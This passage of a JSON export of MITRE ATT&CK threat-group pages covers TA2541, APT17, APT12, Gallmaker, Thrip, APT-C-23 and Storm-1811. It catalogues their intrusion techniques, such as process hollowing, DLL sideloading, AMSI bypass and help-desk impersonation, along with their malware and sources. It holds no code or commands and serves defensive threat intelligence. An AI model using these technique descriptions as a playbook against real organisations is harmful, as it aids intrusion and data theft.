"content": " TA2541 TA2541 is a cybercriminal group that has been targeting the aviation, aerospace, transportation, manufacturing, and defense industries since at least 2017. TA2541 campaigns are typically high volume and involve the use of commodity remote access tools obfuscated by crypters and themes related to aviation, transportation, and travel.[1][2] ID: G1018 Contributors: Pooja Natarajan, NEC Corporation India; Aaron Jornet Version: 1.1 Created: 12 September 2023 Last Modified: 10 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains TA2541 has registered domains often containing the keywords \"kimjoy,\" \"h0pe,\" and \"grace,\" using domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom.[1][2] .006 Acquire Infrastructure: Web Services TA2541 has hosted malicious files on various platforms including Google Drive, OneDrive, Discord, PasteText, ShareText, and GitHub.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder TA2541 has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell TA2541 has used PowerShell to download files and to inject into various Windows processes.[1] .005 Command and Scripting Interpreter: Visual Basic TA2541 has used VBS files to execute or establish persistence for additional payloads, often using file names consistent with email themes or mimicking system functionality.[1][2] Enterprise T1568 Dynamic Resolution TA2541 has used dynamic DNS services for C2 infrastructure.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography TA2541 has used TLS encrypted C2 communications including for campaigns using AsyncRAT.[2] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools TA2541 has attempted to disable built-in security protections such as Windows AMSI. [1] Enterprise T1105 Ingress Tool Transfer TA2541 has used malicious scripts and macros with the ability to download additional payloads.[2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location TA2541 has used file names to mimic legitimate Windows files or system functionality.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing TA2541 has used a .NET packer to obfuscate malicious files.[2] .013 Obfuscated Files or Information: Encrypted/Encoded File TA2541 has used compressed and char-encoded scripts in operations.[2] .015 Obfuscated Files or Information: Compression TA2541 has used compressed and char-encoded scripts in operations.[2] Enterprise T1588 .001 Obtain Capabilities: Malware TA2541 has used multiple strains of malware available for purchase on criminal forums or in open-source repositories.[1] .002 Obtain Capabilities: Tool TA2541 has used commodity remote access tools.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment TA2541 has sent phishing emails with malicious attachments for initial access including MS Word documents.[1][2] .002 Phishing: Spearphishing Link TA2541 has used spearphishing e-mails with malicious links to deliver malware. [1][3] Enterprise T1055 Process Injection TA2541 has injected malicious code into legitimate .NET related processes including regsvcs.exe, msbuild.exe, and installutil.exe.[1][2] .012 Process Hollowing TA2541 has used process hollowing to execute CyberGate malware.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task TA2541 has used scheduled tasks to establish persistence for installed tools.[1] Enterprise T1518 .001 Software Discovery: Security Software Discovery TA2541 has used tools to search victim systems for security products such as antivirus and firewall software.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware TA2541 has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub.[1][2] Enterprise T1218 .005 System Binary Proxy Execution: Mshta TA2541 has used mshta to execute scripts including VBS.[2] Enterprise T1082 System Information Discovery TA2541 has collected system information prior to downloading malware on the targeted host.[1] Enterprise T1016 .001 System Network Configuration Discovery: Internet Connection Discovery TA2541 has run scripts to check internet connectivity from compromised hosts. [2] Enterprise T1204 .001 User Execution: Malicious Link TA2541 has used malicious links to cloud and web services to gain execution on victim machines.[1][4] .002 User Execution: Malicious File TA2541 has used macro-enabled MS Word documents to lure victims into executing malicious payloads.[1][2][3] Enterprise T1047 Windows Management Instrumentation TA2541 has used WMI to query targeted systems for security products.[1] Software ID Name References Techniques S0331 Agent Tesla [1] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Application Layer Protocol: Mail Protocols, Archive Collected Data, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Clipboard Data, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Deobfuscate/Decode Files or Information, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exploitation for Client Execution, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Process Injection: Process Hollowing, Scheduled Task/Job: Scheduled Task, Screen Capture, System Binary Proxy Execution: Regsvcs/Regasm, System Information Discovery, System Network Configuration Discovery, System Network Configuration Discovery: Wi-Fi Discovery, System Owner/User Discovery, System Time Discovery, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Credentials in Registry, User Execution: Malicious File, Video Capture, Virtualization/Sandbox Evasion, Windows Management Instrumentation S1087 AsyncRAT [1][5][2][3] Debugger Evasion, Dynamic Resolution, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Input Capture: Keylogging, Native API, Process Discovery, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture, Virtualization/Sandbox Evasion: System Checks S0434 Imminent Monitor [1] Audio Capture, Command and Scripting Interpreter, Credentials from Password Stores: Credentials from Web Browsers, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Input Capture: Keylogging, Native API, Obfuscated Files or Information, Process Discovery, Remote Services: Remote Desktop Protocol, Resource Hijacking: Compute Hijacking, Video Capture S0283 jRAT [1] Audio Capture, Boot or Logon Initialization Scripts: Startup Items, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: JavaScript, Credentials from Password Stores: Credentials from Web Browsers, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Peripheral Device Discovery, Process Discovery, Proxy, Remote Services: Remote Desktop Protocol, Scheduled Transfer, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Video Capture, Windows Management Instrumentation S0198 NETWIRE [1][4] Application Layer Protocol: Web Protocols, Application Window Discovery, Archive Collected Data: Archive via Custom Method, Archive Collected Data, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: XDG Autostart Entries, Boot or Logon Autostart Execution: Login Items, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Launch Agent, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Invalid Code Signature, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Obfuscated Files or Information: Fileless Storage, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Process Injection: Process Hollowing, Proxy, Scheduled Task/Job: Cron, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, User Execution: Malicious File, User Execution: Malicious Link, Web Service S0385 njRAT [1][2] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compile After Delivery, Peripheral Device Discovery, Process Discovery, Query Registry, Remote Services: Remote Desktop Protocol, Remote System Discovery, Replication Through Removable Media, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture S0379 Revenge RAT [1] Audio Capture, Boot or Logon Autostart Execution: Winlogon Helper DLL, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Indirect Command Execution, Ingress Tool Transfer, Input Capture: Keylogging, OS Credential Dumping, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Screen Capture, System Binary Proxy Execution: Mshta, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Video Capture, Web Service: Bidirectional Communication S1086 Snip3 [1][5] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, Drive-by Compromise, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Multi-Stage Channels, Obfuscated Files or Information, Obfuscated Files or Information: Binary Padding, Phishing: Spearphishing Attachment, Phishing: Spearphishing Link, Process Injection: Process Hollowing, System Information Discovery, User Execution: Malicious File, User Execution: Malicious Link, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion: System Checks, Web Service, Windows Management Instrumentation S0670 WarzoneRAT [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Component Object Model Hijacking, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts, Hide Artifacts: Hidden Window, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Proxy, Remote Services: Remote Desktop Protocol, Remote Services: VNC, Rootkit, System Information Discovery, Template Injection, User Execution: Malicious File, Video Capture References Larson, S. and Wise, J. (2022, February 15). Charting TA2541's Flight. Retrieved September 12, 2023. Ventura, V. (2021, September 16). Operation Layover: How we tracked an attack on the aviation industry to five years of compromise. Retrieved September 15, 2023. Jornet, A. (2021, December 23). Snip3, an investigation into malware. Retrieved September 19, 2023. Maniath, S. and Kadam P. (2019, March 19). Dissecting a NETWIRE Phishing Campaign's Usage of Process Hollowing. Retrieved January 7, 2021. Lorber, N. (2021, May 7). Revealing the Snip3 Crypter, a Highly Evasive RAT Loader. Retrieved September 13, 2023. "
},
{
"id": 100,
"title": "APT17, Deputy Dog, Group G0025",
"path": "/groups/G0025/index.html",
"content": " APT17 APT17 is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. [1] ID: G0025 \u24d8 Associated Groups: Deputy Dog Version: 1.1 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Deputy Dog [1] Techniques Used Domain ID Name Use Enterprise T1583 .006 Acquire Infrastructure: Web Services APT17 has created profile pages in Microsoft TechNet that were used as C2 infrastructure.[1] Enterprise T1585 Establish Accounts APT17 has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads.[1] Software ID Name References Techniques S0069 BLACKCOFFEE [1] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Multi-Stage Channels, Process Discovery, Web Service: Dead Drop Resolver, Web Service: Bidirectional Communication References FireEye Labs/FireEye Threat Intelligence. (2015, May 14). Hiding in Plain Sight: FireEye and Microsoft Expose Obfuscation Tactic. Retrieved November 17, 2024. "
},
{
"id": 101,
"title": "APT12, IXESHE, DynCalc, Numbered Panda, DNSCALC, Group G0005",
"path": "/groups/G0005/index.html",
"content": " APT12 APT12 is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.[1] ID: G0005 \u24d8 Associated Groups: IXESHE, DynCalc, Numbered Panda, DNSCALC Version: 2.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description IXESHE [1] [2] DynCalc [1] [2] Numbered Panda [1] DNSCALC [2] Techniques Used Domain ID Name Use Enterprise T1568 .003 Dynamic Resolution: DNS Calculation APT12 has used multiple variants of DNS Calculation including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port.[1] Enterprise T1203 Exploitation for Client Execution APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).[2][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT12 has sent emails with malicious Microsoft Office documents and PDFs attached.[2][3] Enterprise T1204 .002 User Execution: Malicious File APT12 has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.[2][3] Enterprise T1102 .002 Web Service: Bidirectional Communication APT12 has used blogs and WordPress for C2 infrastructure.[1] Software ID Name References Techniques S0040 HTRAN [3] Process Injection, Proxy, Rootkit S0015 Ixeshe [4][2] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Process Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery S0003 RIPTIDE [2] Application Layer Protocol: Web Protocols, Encrypted Channel: Symmetric Cryptography References Meyers, A. (2013, March 29). Whois Numbered Panda. Retrieved January 14, 2016. Moran, N., Oppenheim, M., Engle, S., & Wartell, R.. (2014, September 3). Darwin\u2019s Favorite APT Group [Blog]. Retrieved November 12, 2014. Sancho, D., et al. (2012, May 22). IXESHE An APT Campaign. Retrieved June 7, 2019. Moran, N., & Villeneuve, N. (2013, August 12). Survival of the Fittest: New York Times Attackers Evolve Quickly [Blog]. Retrieved November 17, 2024. "
},
{
"id": 102,
"title": "Gallmaker, Group G0084",
"path": "/groups/G0084/index.html",
"content": " Gallmaker Gallmaker is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors.[1] ID: G0084 Version: 1.1 Created: 30 January 2019 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1560 .001 Archive Collected Data: Archive via Utility Gallmaker has used WinZip, likely to archive data prior to exfiltration.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Gallmaker used PowerShell to download additional payloads and for execution.[1] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange Gallmaker attempted to exploit Microsoft\u2019s DDE protocol in order to gain access to victim machines and for execution.[1] Enterprise T1027 Obfuscated Files or Information Gallmaker obfuscated shellcode used during execution.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Gallmaker sent emails with malicious Microsoft Office documents attached.[1] Enterprise T1204 .002 User Execution: Malicious File Gallmaker sent victims a lure document with a warning that asked victims to \"enable content\" for execution.[1] References Symantec Security Response. (2018, October 10). Gallmaker: New Attack Group Eschews Malware to Live off the Land. Retrieved November 27, 2018. "
},
{
"id": 103,
"title": "Thrip, Group G0076",
"path": "/groups/G0076/index.html",
"content": " Thrip Thrip is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as \"living off the land\" techniques. [1] ID: G0076 Version: 1.2 Created: 17 October 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.[1] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Thrip has obtained and used tools such as Mimikatz and PsExec.[1] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software Thrip used a cloud-based remote access software called LogMeIn for their attacks.[1] Software ID Name References Techniques S0261 Catchamas [1] Application Window Discovery, Clipboard Data, Create or Modify System Process: Windows Service, Data Staged: Local Data Staging, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Modify Registry, Screen Capture, System Network Configuration Discovery S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0029 PsExec Thrip used PsExec to move laterally between computers on the victim\u2019s network.[1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution References Security Response Attack Investigation Team. (2018, June 19). Thrip: Espionage Group Hits Satellite, Telecoms, and Defense Companies. Retrieved July 10, 2018. "
},
{
"id": 104,
"title": "APT-C-23, Mantis, Arid Viper, Desert Falcon, TAG-63, Grey Karkadann, Big Bang APT, Two-tailed Scorpion, Group G1028",
"path": "/groups/G1028/index.html",
"content": " APT-C-23 APT-C-23 is a threat group that has been active since at least 2014.[1] APT-C-23 has primarily focused its operations on the Middle East, including Israeli military assets. APT-C-23 has developed mobile spyware targeting Android and iOS devices since 2017.[2] ID: G1028 \u24d8 Associated Groups: Mantis, Arid Viper, Desert Falcon, TAG-63, Grey Karkadann, Big Bang APT, Two-tailed Scorpion Contributors: Sittikorn Sangrattanapitak Version: 1.0 Created: 26 March 2024 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Mantis [1][3] Arid Viper [2][3][4] Desert Falcon [2][3][4] Grey Karkadann [3] Big Bang APT [5] Two-tailed Scorpion [2] Techniques Used Domain ID Name Use Mobile T1655 .001 Masquerading: Match Legitimate Name or Location APT-C-23 has masqueraded malware as legitimate applications.[2][6][7] Mobile T1660 Phishing APT-C-23 sends malicious links to victims to download the masqueraded application.[7][6] Mobile T1422 System Network Configuration Discovery APT-C-23 can collect the victim\u2019s phone number, device information, IMSI, etc.[6] Software ID Name References Techniques S0505 Desert Scorpion Archive Collected Data, Audio Capture, Data from Local System, Download New Code at Runtime, File and Directory Discovery, Hide Artifacts: Suppress Application Icon, Indicator Removal on Host: File Deletion, Location Tracking, Out of Band Data, Protected User Data: SMS Messages, Protected User Data: Contact List, SMS Control, Software Discovery, Stored Application Data, Subvert Trust Controls: Code Signing Policy Modification, System Information Discovery, Video Capture S0577 FrozenCell Archive Collected Data, Audio Capture, Data from Local System, Download New Code at Runtime, File and Directory Discovery, Location Tracking, Masquerading: Match Legitimate Name or Location, Protected User Data: SMS Messages, Stored Application Data, System Information Discovery, System Network Configuration Discovery S0339 Micropsia Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Audio Capture, Automated Collection, Boot or Logon Autostart Execution: Shortcut Modification, Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Obfuscated Files or Information: Encrypted/Encoded File, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Owner/User Discovery, Windows Management Instrumentation S1126 Phenakite [3][4] Audio Capture, Data from Local System, Exploitation for Privilege Escalation, Ingress Tool Transfer, Input Capture, Masquerading: Match Legitimate Name or Location, Protected User Data: SMS Messages, Protected User Data: Contact List, System Information Discovery, Video Capture S1195 SpyC23 [2][4][6][7] Access Notifications, Application Layer Protocol: Web Protocols, Audio Capture, Call Control, Data from Local System, Event Triggered Execution: Broadcast Receivers, Hide Artifacts: User Evasion, Hide Artifacts: Suppress Application Icon, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Location Tracking, Masquerading: Match Legitimate Name or Location, Obfuscated Files or Information, Out of Band Data, Protected User Data: Contact List, Protected User Data, Protected User Data: SMS Messages, Screen Capture, SMS Control, Video Capture, Virtualization/Sandbox Evasion References Symantec Threat Hunter Team. (2023, April 4). Mantis: New Tooling Used in Attacks Against Palestinian Targets. Retrieved March 4, 2024. Stefanko, L. (2020, September 30). APT\u2011C\u201123 group evolves its Android spyware. Retrieved March 4, 2024. Hegel, T., Milenkoski, A. (2023, October 24). The Israel-Hamas War | Cyber Domain State-Sponsored Activity of Interest. Retrieved March 4, 2024. Flossman, M., Scott, M. (2021, April). Technical Paper // Taking Action Against Arid Viper. Retrieved November 17, 2024. Kayal, A. (2018, August 26). Interactive Mapping of APT-C-23. Retrieved March 4, 2024. CheckPoint Research. (2020, February 16). Hamas Android Malware On IDF Soldiers-This is How it Happened. Retrieved November 17, 2024. Kohli, P. (2021, November 23). Android APT spyware, targeting Middle East victims, enhances evasiveness. Retrieved November 17, 2024. "
},
{
"id": 105,
"title": "Storm-1811, Group G1046",
"path": "/groups/G1046/index.html",
"content": " Storm-1811 Storm-1811 is a financially-motivated entity linked to Black Basta ransomware deployment. Storm-1811 is notable for unique phishing and social engineering mechanisms for initial access, such as overloading victim email inboxes with non-malicious spam to prompt a fake \"help desk\" interaction leading to the deployment of adversary tools and capabilities.[1][2][3][4] ID: G1046 Contributors: Liran Ravich, CardinalOps; Joe Gumke, U.S. Bank Version: 1.0 Created: 14 March 2025 Last Modified: 14 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account Storm-1811 has performed domain account enumeration during intrusions.[1] Enterprise T1583 .001 Acquire Infrastructure: Domains Storm-1811 has created domains for use with RMM tools.[2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Storm-1811 has created Windows Registry Run keys that execute various batch scripts to establish persistence on victim devices.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Storm-1811 has used PowerShell for multiple purposes, such as using PowerShell scripts executing in an infinite loop to create an SSH connection to a command and control server.[2] .003 Command and Scripting Interpreter: Windows Command Shell Storm-1811 has used multiple batch scripts during initial access and subsequent actions on victim machines.[1][2] Enterprise T1486 Data Encrypted for Impact Storm-1811 is a financially-motivated entity linked to the deployment of Black Basta ransomware in victim environments.[1] Enterprise T1074 .001 Data Staged: Local Data Staging Storm-1811 has locally staged captured credentials for subsequent manual exfiltration.[2] Enterprise T1140 Deobfuscate/Decode Files or Information Storm-1811 has distributed password-protected archives such as ZIP files during intrusions.[2] Enterprise T1482 Domain Trust Discovery Storm-1811 has enumerated domain accounts and access during intrusions.[1] Enterprise T1667 Email Bombing Storm-1811 has deployed large volumes of non-malicious email spam to victims in order to prompt follow-on interactions with the threat actor posing as IT support or helpdesk to resolve the problem.[2][3] Enterprise T1585 .003 Establish Accounts: Cloud Accounts Storm-1811 has created malicious accounts to enable activity via Microsoft Teams, typically spoofing various IT support and helpdesk themes.[1] Enterprise T1048 .002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol Storm-1811 has exfiltrated captured user credentials via Secure Copy Protocol (SCP).[2] Enterprise T1222 .001 File and Directory Permissions Modification: Windows File and Directory Permissions Modification Storm-1811 has used cacls.exe via batch script to modify file and directory permissions in victim environments.[2] Enterprise T1574 .001 Hijack Execution Flow: DLL Storm-1811 has deployed a malicious DLL (7z.DLL) that is sideloaded by a modified, legitimate installer (7zG.exe) when that installer is executed with an additional command line parameter of b at runtime to load a Cobalt Strike beacon payload.[2] Enterprise T1656 Impersonation Storm-1811 impersonates help desk and IT support personnel for phishing and social engineering purposes during initial access to victim environments.[1] Enterprise T1105 Ingress Tool Transfer Storm-1811 has used scripted cURL commands, BITSAdmin, and other mechanisms to retrieve follow-on batch scripts and tools for execution on victim devices.[1][2][4] Enterprise T1056 Input Capture Storm-1811 has used a PowerShell script to capture user credentials after prompting a user to authenticate to run a malicious script masquerading as a legitimate update item.[2] Enterprise T1570 Lateral Tool Transfer Storm-1811 has used the Impacket toolset to move and remotely execute payloads to other hosts in victim networks.[2] Enterprise T1036 Masquerading Storm-1811 has prompted users to download and execute batch scripts that masquerade as legitimate update files during initial access and social engineering operations.[2] .005 Match Legitimate Resource Name or Location Storm-1811 has disguised Cobalt Strike installers as a malicious DLL masquerading as part of a legitimate 7zip installation package.[2] .010 Masquerade Account Name Storm-1811 has created Microsoft Teams accounts that spoof IT support and helpdesk members for use in application and voice phishing.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Storm-1811 XOR encodes a Cobalt Strike installation payload in a DLL file that is decoded with a hardcoded key when called by a legitimate 7zip installation process.[2] Enterprise T1588 .002 Obtain Capabilities: Tool Storm-1811 acquired various legitimate and malicious tools, such as RMM software and commodity malware packages, for operations.[1][2] Enterprise T1566 .002 Phishing: Spearphishing Link Storm-1811 has distributed malicious links to victims that redirect to EvilProxy-based phishing sites to harvest credentials.[1] .003 Phishing: Spearphishing via Service Storm-1811 has used Microsoft Teams to send messages and initiate voice calls to victims posing as IT support personnel.[1] .004 Phishing: Spearphishing Voice Storm-1811 has initiated voice calls with victims posing as IT support to prompt users to download and execute scripts and other tools for initial access.[1][2][3] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software Storm-1811 has abused multiple types of legitimate remote access software and tools, such as ScreenConnect, NetSupport Manager, and AnyDesk.[1][2] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Storm-1811 has attempted to move laterally in victim environments via SMB using Impacket.[2] .004 Remote Services: SSH Storm-1811 has used OpenSSH to establish an SSH tunnel to victims for persistent access.[1] Enterprise T1033 System Owner/User Discovery Storm-1811 has used whoami.exe to determine if the active user on a compromised system is an administrator.[2] Enterprise T1204 .002 User Execution: Malicious File Storm-1811 has prompted users to execute downloaded software and payloads as the result of social engineering activity.[1][2][3] Software ID Name References Techniques S0190 BITSAdmin Storm-1811 has used BITSAdmin to download payloads.[1][4] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S1070 Black Basta Storm-1811 is associated with the deployment of Black Basta ransomware.[1][2] Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Data Encrypted for Impact, Debugger Evasion, Defacement: Internal Defacement, Execution Guardrails: Mutual Exclusion, File and Directory Discovery, File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, Impair Defenses: Safe Mode Boot, Inhibit System Recovery, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Obfuscated Files or Information: Binary Padding, Remote System Discovery, Subvert Trust Controls: Code Signing, System Information Discovery, System Service Discovery, System Shutdown/Reboot, User Execution: Malicious File, Virtualization/Sandbox Evasion, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation S0154 Cobalt Strike Storm-1811 operations include the use of Cobalt Strike.[1][2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, 